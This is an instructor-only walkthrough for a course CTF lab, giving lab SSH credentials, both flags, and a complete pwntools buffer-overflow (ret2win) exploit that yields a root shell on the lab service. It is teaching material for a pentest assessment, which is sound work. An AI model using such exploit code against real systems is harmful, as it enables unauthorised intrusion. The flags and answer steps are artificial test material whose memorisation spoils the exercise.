# Week 10 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w10_ssh_initial_access}`)

**Step 1 — Recon the web hint page:**
```bash
curl http://10.10.10.10
# Page mentions: lowpriv / lowpriv123 and port 9999
```

**Step 2 — SSH in:**
```bash
ssh lowpriv@10.10.10.11
# Password: lowpriv123
```

**Step 3 — Read the flag:**
```bash
cat /home/lowpriv/user.txt
```

---

## Flag 2 — root.txt (`flag{w10_buffer_overflow_rce}`)

**Step 1 — Connect to the vuln service to get the leaked address:**
```bash
nc 10.10.10.11 9999
# Output: "secret_function() is at: 0x<address>"
```

Note the address — with no PIE, it is fixed across runs.

**Step 2 — Find the offset (from attacker container):**
```bash
python3 /root/tools/exploit_template.py
# step2_find_offset() — sends a cyclic pattern, reads the crash EIP/RIP
```

With GDB on the attacker (or the template):
```python
from pwn import *
io = remote('10.10.10.11', 9999)
io.recvline()   # discard the address leak line
io.send(cyclic(200))
# Crash occurs; offset is 72 bytes for the 64-byte buffer + 8-byte saved RBP
```

**Step 3 — Build and send the exploit:**
```python
from pwn import *
TARGET = '10.10.10.11'
PORT   = 9999
OFFSET = 72                    # 64-byte buf + 8-byte saved RBP
SECRET = 0x<leaked_address>    # replace with actual leaked value

io = remote(TARGET, PORT)
line = io.recvline()
# Parse leaked address if not hardcoded
SECRET = int(line.split()[-1], 16)

payload = b'A' * OFFSET + p64(SECRET)
io.send(payload)
io.interactive()   # drops into /bin/sh running as root
```

**Step 4 — Read the root flag from the shell:**
```bash
cat /root/root.txt
```

---

## Teaching Points

- `flag{w10_ssh_initial_access}` = recon → initial foothold with valid credentials
- `flag{w10_buffer_overflow_rce}` = full exploit chain: recon → vuln discovery → offset calculation → ret2win → root shell
- The address leak removes ASLR as a variable so students focus on overflow mechanics
- `/root/root.txt` is only readable by root — the BOF is the only path in (no sudo, no SUID)
- This maps directly to Assessment 2: students document each step for their pentest report
